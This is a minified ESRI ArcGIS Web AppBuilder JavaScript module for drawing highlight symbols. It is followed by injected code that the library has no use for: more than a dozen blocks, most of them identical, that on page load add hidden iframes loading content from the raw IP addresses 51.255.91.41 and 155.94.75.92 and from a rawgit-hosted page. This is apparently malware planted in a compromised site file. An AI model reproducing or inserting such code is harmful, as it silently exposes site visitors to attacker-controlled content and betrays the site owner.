// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define("dojo/_base/lang dojo/_base/array esri/geometry/Point esri/geometry/Polygon esri/geometry/Polyline esri/graphic esri/symbols/SimpleMarkerSymbol esri/symbols/SimpleLineSymbol esri/symbols/SimpleFillSymbol esri/Color".split(" "),function(n,r,t,u,v,m,p,h,q,l){var g={getHighLightSymbol:function(c,a){switch(c.geometry.type){case "point":return g._getPointSymbol(c,a);case "polyline":return g._getPolyLineSymbol(c,a);case "polygon":return g._getPolygonSymbol(c,a)}},_getSizeInfo:function(c){var a=null;
c.renderer.visualVariables&&r.forEach(c.renderer.visualVariables,n.hitch(this,function(b){"sizeInfo"===b.type&&(a=b)}));return a},_getPointSymbol:function(c,a){var b,d,e,f,k;d=!1;b=new p(p.STYLE_SQUARE,null,new h(h.STYLE_SOLID,new l([0,255,255,1]),3));b.setColor(null);b.size=30;if(a&&a.renderer)if(a.renderer.symbol)d=!0,b=g._updatePointSymbolProperties(b,a.renderer.symbol);else if(a.renderer.infos&&0<a.renderer.infos.length){for(k=0;k<a.renderer.infos.length;k++)a.typeIdField?e=c.attributes[a.typeIdField]:
a.renderer.attributeField&&(e=c.attributes[a.renderer.attributeField]),f=a.renderer.infos[k].value,void 0!==e&&null!==e&&""!==e&&void 0!==f&&null!==f&&""!==f&&e.toString()===f.toString()&&(d=!0,b=g._updatePointSymbolProperties(b,a.renderer.infos[k].symbol));!d&&a.renderer.defaultSymbol&&(d=!0,b=g._updatePointSymbolProperties(b,a.renderer.defaultSymbol))}a&&a.graphics&&0<a.graphics.length&&a._getSymbol(c)&&((e=c.getShape())&&e.shape?e.shape.hasOwnProperty("r")?(d=!0,b.size=2*e.shape.r+10):e.shape.hasOwnProperty("width")&&
(d=!0,a.renderer&&a.renderer.infos&&0<a.renderer.infos.length&&(b=g._updatePointSymbolProperties(b,a.renderer.infos[0].symbol)),b.size=e.shape.width+10):a.renderer.visualVariables&&(d=a._getRenderer(c),e=g._getSizeInfo(a))&&(a=d.getSize(c,{sizeInfo:e,shape:a._getSymbol(c),resolution:a&&a.getResolutionInMeters&&a.getResolutionInMeters()}),null!==a&&(b.size=a+10)));a=new t(c.geometry.x,c.geometry.y,c.geometry.spatialReference);return new m(a,b,c.attributes)},_updatePointSymbolProperties:function(c,
a){var b,d;a.hasOwnProperty("height")&&a.hasOwnProperty("width")&&(b=a.height,d=a.width,b=(b>d?b:d)+10,c.size=b);a.hasOwnProperty("size")&&(!b||b<a.size)&&(c.size=a.size+10);a.hasOwnProperty("xoffset")&&(c.xoffset=a.xoffset);a.hasOwnProperty("yoffset")&&(c.yoffset=a.yoffset);return c},_getPolyLineSymbol:function(c,a){var b,d,e,f;b=5;if(a&&a.renderer)if(a.renderer.symbol&&a.renderer.symbol.hasOwnProperty("width"))b=a.renderer.symbol.width;else if(a.renderer.infos&&0<a.renderer.infos.length)for(f=0;f<
a.renderer.infos.length;f++)a.typeIdField?d=c.attributes[a.typeIdField]:a.renderer.attributeField&&(d=c.attributes[a.renderer.attributeField]),e=a.renderer.infos[f].value,void 0!==d&&null!==d&&""!==d&&void 0!==e&&null!==e&&""!==e&&d.toString()===e.toString()&&a.renderer.infos[f].symbol.hasOwnProperty("width")&&(b=a.renderer.infos[f].symbol.width);else a.renderer.defaultSymbol&&a.renderer.defaultSymbol.hasOwnProperty("width")&&(b=a.renderer.defaultSymbol.width);a=new h(h.STYLE_SOLID,new l([0,255,255,
1]),b);b=new v(c.geometry.spatialReference);c.geometry.paths&&0<c.geometry.paths.length&&b.addPath(c.geometry.paths[0]);return new m(b,a,c.attributes)},_getPolygonSymbol:function(c){var a,b;a=new q(q.STYLE_SOLID,new h(h.STYLE_SOLID,new l([0,255,255,1]),4),new l([0,0,0,0]));b=new u(c.geometry.spatialReference);c.geometry.rings&&(b.rings=n.clone(c.geometry.rings));return new m(b,a,c.attributes)}};return g});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});